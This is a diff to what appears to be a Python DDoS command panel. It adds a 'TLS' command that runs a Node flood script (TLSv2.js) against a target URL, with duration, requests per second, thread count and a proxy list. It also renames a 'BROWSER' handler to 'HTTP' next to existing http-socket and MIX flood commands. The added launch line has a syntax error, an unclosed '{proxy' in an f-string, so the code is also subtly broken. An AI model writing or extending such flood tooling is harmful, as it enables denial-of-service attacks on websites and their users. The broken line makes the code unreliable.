@@ -633,7 +633,7 @@ def main():
                 print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
                 print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
 
-        elif "BROWSER" in cnc:
+        elif "HTTP" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
@@ -656,6 +656,17 @@ def main():
                 print('Usage: MIX <url> <thread> <time>')
                 print('Example: MIX https://example.com 500 60')
 
+        elif "TLS" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                thread = cnc.split()[4]
+                proxy = cnc.split()[5]
+                os.system(f'node TLSv2.js {url} {time} {rps} {thread} {proxy')
+            except IndexError:
+                print('Usage: TLS <url> <time> <rps> <thread> <proxy ')
+                print('Example: TLS https://example.com 60 500 500 http.txt')
 
         
 
